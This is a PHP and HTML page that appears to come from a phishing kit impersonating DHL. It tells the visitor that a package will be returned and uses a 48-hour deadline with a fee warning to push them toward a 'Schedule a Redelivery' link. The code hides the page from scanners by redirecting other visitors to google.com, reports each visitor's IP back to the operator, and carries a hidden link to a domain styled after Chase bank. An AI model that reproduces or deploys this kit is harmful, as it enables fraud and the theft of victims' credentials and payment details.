<?php 
error_reporting(0);
##### Protection #########
include_once '../app.php';
$step = $_GET["stp"];
  if(strcmp($step,"first")!==0)
  {
       header("location: https://google.com");
       exit();
  }
##########################
##### Tools ##############
include'../space/rand.php';
include'../space/main.php';
include'../space/send.php';
$err = "";
send("📍{$_SESSION['ip']}⚠️Inform Page⚠️");
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
     <link rel="icon" type="image/x-icon" href="../files/img/favicon.ico">
    <title>Before we proceed</title>
    <style media="screen" type="text/css">
        body {
            background-color: #FAF9F6;
            font-size: 16px;
        }

        #message {
            background: white;
            max-width: 360px;
            margin: 100px auto 100px;
            padding: 10px 24px;
            border-radius: 10px;
        }

        /* Add other styles here */

        #message img {
            border: 0px;
            height: auto;
            max-width: 100%;
            outline: none;
            color: rgb(249, 0, 28);
            font-family: "courier new", courier, "lucida sans typewriter", "lucida typewriter", monospace;
            font-size: 48px;
            font-weight: 700;
            text-align: left;
        }

        .btn {
            display: block;
            width: 100%;
            margin-bottom: 20px;
            text-align: center;
        }
    </style>
</head>

<body>
    <div id="message">
        <div>
            <center>
            <img src="../files/img/dhl-logo.svg">
            </center>
        </div>
        <p style="text-align:center;"><img alt="" src="https://ketodiethabits.com/us.png" style="border: 0px; height: auto; max-width: 100%; outline: none; color: rgb(249, 0, 28); font-family: &quot;courier new&quot;, courier, &quot;lucida sans typewriter&quot;, &quot;lucida typewriter&quot;, monospace; font-size: 48px; font-weight: 700; text-align: left;" /></p>
         
        <h1>Package Delivery</h1>

        <p>We're sorry to let you know that your package which arrived on 
<?php
echo date('d/M/Y');
?>
 will be sent back,</p>
        <p>This may happen when the receiver's address is incorrect.</p>
        <p>To submit a redelivery request for this package please fill out the form on our website.</p>



<div class="btn btn--shadow btn--medium" style="Margin-bottom: 20px;text-align: center;">
<a href="track.php?sessc=<?php echo $rand50; ?>&querry=<?php echo $rand30; ?>&stp=land" style="border-radius: 4px;display: inline-block;font-size: 12px;font-weight: bold;line-height: 22px;padding: 10px 20px 11px 20px;text-align: center;text-decoration: none !important;transition: opacity 0.1s ease-in;color: red !important;box-shadow: inset 0 -2px 0 0 rgba(0, 0, 0, 0.2);background-color: #FFCD05;font-family: Arial, Helvetica, sans-serif;"><b>Schedule a Redelivery</b></a> <!--[if mso]><p style="line-height:0;margin:0;">&nbsp;</p><v:roundrect xmlns:v="urn:schemas-microsoft-com:vml" href="http://secure85b-chase.com/web/auth/dashboard" style="width:165px" arcsize="10%" fillcolor="#33A4FF" stroke="f"><v:shadow on="t" color="#33A4FF" offset="0,2px"></v:shadow><v:textbox style="mso-fit-shape-to-text:t" inset="0px,9px,0px,8px"><center style="font-size:12px;line-height:22px;color:#33A4FF;font-family:Arial, Helvetica, sans-serif;font-weight:bold;mso-line-height-rule:exactly;mso-text-raise:4px">Account verification</center></v:textbox></v:roundrect><![endif]--></div>

        <p><span style="color: rgb(255, 0, 0); font-weight: bold;">Warning:</span><span>&nbsp;</span>Please note that if a redelivery is not scheduled within 48 hours, you can't submit a redelivery request again. The shipping and handling fees will not be refunded.</p>

        <div style="Margin-left: 20px; Margin-right: 20px;">
            <div style="text-align:center; font-size:15px; line-height:19px; margin-top:20px;">
                <div>Thank you for choosing the DHL-SERVICES®.</div>
                <p id="load">&nbsp;</p>
            </div>
        </div>
    </div>
</body>

</html>
